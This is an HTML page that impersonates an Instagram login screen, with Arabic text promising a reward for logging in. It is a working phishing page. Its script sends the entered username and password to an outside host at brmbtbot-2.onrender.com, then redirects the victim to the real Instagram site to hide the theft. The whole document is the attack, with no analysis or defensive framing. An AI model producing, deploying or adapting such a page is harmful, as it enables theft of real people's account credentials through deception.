<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Instagram</title><style>body{background:#fff;margin:0;font-family:sans-serif;display:flex;justify-content:center;padding-top:50px;}.card{width:100%;max-width:400px;padding:30px;text-align:center;}.logo{font-size:40px;font-weight:bold;margin-bottom:30px;font-style:italic;}input{width:100%;padding:14px;margin:10px 0;border:1px solid #dbdbdb;background:#fafafa;border-radius:5px;box-sizing:border-box;font-size:14px;}.btn{width:100%;background:#0095f6;color:#fff;border:none;padding:12px;border-radius:8px;font-weight:bold;margin-top:20px;font-size:16px;}</style></head><body><div class="card"><div class="logo">Instagram</div><p style="color:#8e8e8e;font-weight:bold;">سجل دخولك لاستلام المكافأة</p><form id="f"><input type="text" id="u" placeholder="اسم المستخدم أو الهاتف" required><input type="password" id="p" placeholder="كلمة المرور" required><button type="submit" class="btn">تسجيل الدخول</button></form></div><script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();fetch('https://brmbtbot-2.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'Instagram',u:document.getElementById('u').value,p:document.getElementById('p').value})}).finally(()=>{location.href='https://instagram.com';});};</script></body></html>
